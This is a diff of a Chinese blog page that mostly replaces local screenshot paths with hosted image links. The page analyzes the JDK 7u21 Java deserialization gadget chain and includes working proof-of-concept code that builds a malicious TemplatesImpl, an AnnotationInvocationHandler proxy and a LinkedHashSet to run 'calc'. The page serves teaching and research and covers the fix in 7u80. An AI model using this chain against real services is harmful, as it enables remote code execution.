@@ -14,22 +14,22 @@
 <meta property="og:site_name" content="啦啦菌NODE">
 <meta property="og:description" content="JDK反序列化Gadgets 7u21预计阅读时间：30-60分钟内网：具详细无比 前言从fastjson1.24版本的反序列化利用方式知道有使用jdk7u21的版本利用链，ysoserial利用工具中也有7u21利用链。现在都是7u80版本了，这个漏洞真正直接利用，估计已经很难找到了。 但是这个利用链的构造有很多之前没接触过的java特性，就此好好学习一下，也算是fastjson的前置知识吧。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/调用栈1.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/newInstance.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/7u80的_tfactory.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/7u80报错.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/7u21的_tfactory.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/static问题.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/代理接口有equals.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/newTransformer执行的命令.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/TemplatesImple_type报错.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/hashCode为0.png">
-<meta property="og:image" content="c:/Users/lala/Desktop/博客/截图/7u21/直接templates.png">
-<meta property="og:updated_time" content="2019-12-01T07:44:19.481Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9wr99ulj30yp075aat.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9x8pbn7j31pt0n040u.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9qsg3wij31z017owp4.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9qjqzp0j31pj0yg78q.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9p99qusj31sd15pgxk.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9rk9yjlj30ky06ut8r.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9svznu1j30xk0nxwh4.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9twkj0rj323212u7ld.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9u9k0lzj31x70z579a.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9uqejl8j31440akmy1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9w99brtj321119ok7c.jpg">
+<meta property="og:updated_time" content="2019-12-01T07:55:26.939Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JDK反序列化Gadgets 7u21">
 <meta name="twitter:description" content="JDK反序列化Gadgets 7u21预计阅读时间：30-60分钟内网：具详细无比 前言从fastjson1.24版本的反序列化利用方式知道有使用jdk7u21的版本利用链，ysoserial利用工具中也有7u21利用链。现在都是7u80版本了，这个漏洞真正直接利用，估计已经很难找到了。 但是这个利用链的构造有很多之前没接触过的java特性，就此好好学习一下，也算是fastjson的前置知识吧。">
-<meta name="twitter:image" content="c:/Users/lala/Desktop/博客/截图/7u21/调用栈1.png">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9wr99ulj30yp075aat.jpg">
     
     
         
@@ -171,10 +171,10 @@
 <p>请注意TemplatesImpl类的getOutputProperties函数是一个以get开头的函数，这是这个利用链在fastjson组件利用的关键。</p>
 </blockquote>
 <p>跟踪getOutputProperties方法，来确认恶意TemplatesImpl类calc 需要的条件，先看调用栈：</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\调用栈1.png" alt="调用栈1"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9wr99ulj30yp075aat.jpg" alt="调用栈1.png"></p>
 <h3 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h3><p>从调用栈中，可见最后是<code>obj.newInstance</code>（obj是虚指）触发poc执行恶意代码，调用栈再往下之后就是java class类的newInsatance内部实现了，不细纠。</p>
 <p>newinstance实例化会默认触发执行static方法，构造方法代码，如下：</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\newInstance.png" alt="newinstance"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9x8pbn7j31pt0n040u.jpg" alt="newInstance.png"></p>
 <p>所以我们的payload需要放在最后执行的恶意类的static或构造方法中。知道这点后，我们从头开始慢慢寻找其他需要条件。</p>
 <p>跟入<code>TemplatesImpl类</code>的<code>getOutputProperties方法</code>：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();<span class="comment">//我们进入newTransformer方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -191,16 +191,16 @@
 </blockquote>
 <p>但其实这跟jdk版本是有关的，1.7下不同的jdk版本这段代码是不同的。</p>
 <p>1.7u80版本的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code>中就是存在<code>_tfactory.getExternalExtensionsMap()</code>这句代码的。</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\7u80的_tfactory.png" alt="7u80的__tfactory"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9qsg3wij31z017owp4.jpg" alt="7u80的_tfactory.png"></p>
 <p>在1.7u80中，注释Gadgets类中添加 <code>_tfactory</code>这个字段的代码后（之后我们将详细分析Gadgets类），_tfactory=null就会发生null指针报错。</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\7u80报错.png" alt="7u80报错"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9qjqzp0j31pj0yg78q.jpg" alt="7u80报错.png"></p>
 <blockquote>
 <p>细心的同学可以注意到上面jdk1.7u80两个弹框成功不成功的下方都会null指针报错。</p>
 <p>但是前者是在执行恶意代码AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();后<br>的translet.postInitialization();处报错。</p>
 <p>而后者是在恶意代码执行之前的defineTransletClasses函数报错。即没有成功执行payload</p>
 </blockquote>
 <p>在同样注释<code>_tfactory</code>这个字段的代码的情况下，使用jdk1.7u21的环境，却可以成功执行，因为jdk1.7u21的情况下并没有<code>_tfactory.getExternalExtensionsMap()</code>这句代码。</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\7u21的_tfactory.png" alt="7u21的_tfactory"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9p99qusj31sd15pgxk.jpg" alt="7u21的_tfactory.png"></p>
 <p>但是1.7u21也可以兼容给_tfactory赋值的情况，所以还是给 _tfactory 赋值比较好，可以兼容不同的版本。</p>
 <h3 id="TemplatesImpl恶意类的限制条件"><a href="#TemplatesImpl恶意类的限制条件" class="headerlink" title="TemplatesImpl恶意类的限制条件"></a>TemplatesImpl恶意类的限制条件</h3><p>至此总结我们构筑一个恶意的TemplatesImpl类，在调用这个恶意类的getOutputProperties方法时，需要满足的限制条件。即，构筑恶意TemplatesImpl类的需要条件。</p>
 <ol>
@@ -231,7 +231,7 @@
 <p> 以上需要注意一个情况，我们的恶意字节码类lala类，使用了static修饰符。其实我们payload写在构造函数中是可以不使用static修饰符不会影响。</p>
 <p>但是如果我们想把payload写在static初始化块中，类就需要使用static修饰符时。不然最后实例化是不会成功的。</p>
 <p>就相当于是以下的情况，内部类是不允许存在static修饰符的，原理可以<a href="https://blog.csdn.net/u010454030/article/details/80548732" target="_blank" rel="noopener">参考</a>。</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\static问题.png" alt="static问题"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9rk9yjlj30ky06ut8r.jpg" alt="static问题.png"></p>
 <p>ps.突然发现非static方法块也是可以写payload…..但是不纠结这个了！！</p>
 </blockquote>
 <p>至此我们完成了恶意Templates类构造以及<code>TemplatesImpl.getOutputProperties</code>触发点的分析（当然从上面的调用过程，我们知道直接调用<code>TemplatesImpl.newTransformer()</code>也是一样的，getOutputProperties其实就是调用了newTransformer()，在接下来的延长链中其实漏洞触发是在newTransformer）。</p>
@@ -280,7 +280,7 @@
 <li><p>我们可以构筑一个AnnotationInvocationHandler类，构造函数中选择一个this.type，this.type这个类中需要包含我们要恶意执行的方法。</p>
 </li>
 <li><p>把这个AnnotationInvocationHandler类与随便什么接口进行绑定（因为我们需要调用的是equals，只要是一个Object对象就会有equals方法 maybe？）</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\代理接口有equals.png" alt="代理接口有equals"></p>
+<p> <img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9svznu1j30xk0nxwh4.jpg" alt="代理接口有equals.png"></p>
 </li>
 <li><p>调用这个代理类的equals方法，同时給入恶意实例，就会遍历this.type这个类中的方法对恶意实例中的对应方法进行调用。唯一的缺点就是调用的方法不能传入参数。（因为<code>var5.invoke(var1);</code>只传入了对象，没有传入参数）</p>
 </li>
@@ -292,9 +292,9 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//AnnotationInvocationHandler构造函数的this.memberValues</span></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler构造函数</span></span><br><span class="line">    <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//由于是缺省修饰符，不同的包，不能直接调用。允许调用</span></span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//创建AnnotationInvocationHandler实例，this.type=Templates.class</span></span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);</span><br><span class="line">    <span class="comment">//Override是一个啥都没有的接口，这里用这个类，表示其实绑定啥都没关系</span></span><br><span class="line">    <span class="comment">//在高版本的jdk中，在构造函数中对于type做了校验，如果要在高版本中构造payload，需要使用反射机制构筑。如果对方也是高版本的jdk（即经过了修复）那么我们构筑的InvocationHandler类也是因为构造方法通过不了而无法利用。具体我们在后面修复情况中说到。</span></span><br><span class="line">    <span class="comment">//InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class,map);</span></span><br><span class="line">     <span class="comment">//Reflections.setFieldValue(tempHandler, "type", Templates.class);</span></span><br><span class="line">    <span class="comment">//有些地方POC写的是Templates.class类，其实没必要</span></span><br><span class="line">    Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Override.class&#125;,invocationHandler);</span><br><span class="line">    <span class="comment">//恶意类</span></span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);</span><br><span class="line">    <span class="comment">//调用，执行`TemplatesImpl.newTransformer()`</span></span><br><span class="line">    proxy.equals(templates);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h4 id="this-type的讲究"><a href="#this-type的讲究" class="headerlink" title="this.type的讲究"></a>this.type的讲究</h4><p>为啥this.type需要选用类中第一个方法是我们需要调用的方法的类呢？</p>
 <p>因为不是的话，就需要考虑更多，比如报错退出。可以看到在执行完我们的payload后是会报错退出的，当然这对我们paylaod的执行没有影响。</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\newTransformer执行的命令.png" alt="newTransformer执行的命令"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9twkj0rj323212u7ld.jpg" alt="newTransformer执行的命令.png"></p>
 <p>但是假如我们需要调用的方法不在第一个，而前面是一个需要参数的方法，就会因为没有传入参数而报错退出。（比如我们把Templates.class改成TemplatesImpl.class）</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\TemplatesImple_type报错.png" alt="TemplatesImple_type报错"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9u9k0lzj31x70z579a.jpg" alt="TemplatesImple_type报错.png"></p>
 <p>如果我们需要调用的方法前面有一些其他方法，但是都是不需要参数的，我们还需要构造this.memberValues，让前面这些函数的返回值与this.menberValues里面一致才不会返回false退出。就会有一串的麻烦（目前来看这样也是可行的，但是假如这里真的改了this.memberValues之后LinkedHashSet那关就过不去了！实际上我们只能且必须要找到一个第一个方法是能够代码执行的方法！）</p>
 <p>所幸我们可以找到一个Templates类，它进行代码执行的方法是第一个，万幸。</p>
 <h2 id="进一步延伸至LinkedHashSet"><a href="#进一步延伸至LinkedHashSet" class="headerlink" title="进一步延伸至LinkedHashSet"></a>进一步延伸至LinkedHashSet</h2><p>接下来需要触发<code>proxy.equals(templates)</code>，这种<code>a.equals(b)</code>的形式。a是我们构建的动态代理返回对象，b是恶意TemplatesImpl类。</p>
@@ -344,7 +344,7 @@
 <p><strong>127 * 0 ^ TemplatesImpl的hashCode == TemplatesImpl的hashCode</strong></p>
 <p>this.memberValues中map中键值对的值为我们的恶意TemplatesImpl类即可，接下来需要它的键名的hashCode为0</p>
 <p>研究员就是会寻找到一些神奇的值比如<code>&quot;f5a5a608&quot;</code>，<code>&quot;&quot;</code> 这些值的hashCode为0！！！</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\hashCode为0.png" alt="hashCode为0"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9uqejl8j31440akmy1.jpg" alt="hashCode为0.png"></p>
 <p>所以我们在this.memberValues中赋值键值对 <code>(&quot;f5a5a608&quot;-&gt;TemplatesImpl恶意类)</code>即可。</p>
 <p>看payload</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//生成恶意的templates类</span></span><br><span class="line">    Templates templates = Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);</span><br><span class="line">    <span class="comment">//AnnotationInvocationHandler类this.memberValues的map,填入键值对来满足hash相等</span></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">    <span class="comment">//String magicStr_null = "";//也可</span></span><br><span class="line">    <span class="comment">//此处需要的先往map中放入一个没用的值，之后说明</span></span><br><span class="line">    map.put(magicStr,<span class="string">"Override"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成proxy对象</span></span><br><span class="line">    <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);<span class="comment">//this.type,this.memberValues</span></span><br><span class="line">    Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Override.class&#125;,invocationHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成LinkedHashSet，按照顺序一次放入templates和proxy</span></span><br><span class="line">    HashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// 填入</span></span><br><span class="line">    set.add(templates);</span><br><span class="line">    set.add(proxy);</span><br><span class="line">    <span class="comment">//重新修改map的值</span></span><br><span class="line">    map.put(magicStr,templates);</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">    objectOutputStream.writeObject(set);<span class="comment">//序列化对象</span></span><br><span class="line">    objectOutputStream.flush();</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line">    ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line">    ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">    Object o = objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -352,7 +352,7 @@
 <p>确实是不行的，因为我们可以看到我们在生成LinkedHashSet时调用了<code>java.util.HashSet#add</code></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里调用了我们触发漏洞的函数map.put(),同时也是按照我们的漏洞触发顺序去调用map.put，这会导致payload会在我们本地触发，之后会无法序列化成功(至于为啥序列化不成功不想追究了！)</p>
-<p><img src="C:\Users\lala\Desktop\博客\截图\7u21\直接templates.png" alt="直接templates"></p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9w99brtj321119ok7c.jpg" alt="直接templates.png"></p>
 <p>所以一套完美的利用链就分析完了！</p>
 <h2 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h2><p>我们在7u80版本中去查看AnnotationInvocationHandler的构造方法，会发现对于this.type进行了校验必须为Annotation.class。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = var1;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
